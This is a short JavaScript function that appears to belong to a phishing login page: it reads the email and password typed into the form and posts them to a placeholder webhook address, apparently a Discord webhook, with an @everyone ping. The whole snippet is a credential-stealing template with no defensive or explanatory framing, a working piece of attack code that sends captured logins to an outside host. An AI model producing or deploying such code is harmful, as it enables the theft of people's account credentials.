function next() {
    const webhookURL = 'LINK OF YOUR WEBHOOK'
    const input2 = document.getElementById('email').value
    const input = document.getElementById('password').value
    const message = {
      content: ` @everyone
Email: ${input2}, Password: ${input}`
    }
  
    fetch(webhookURL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(message)
    })
  }
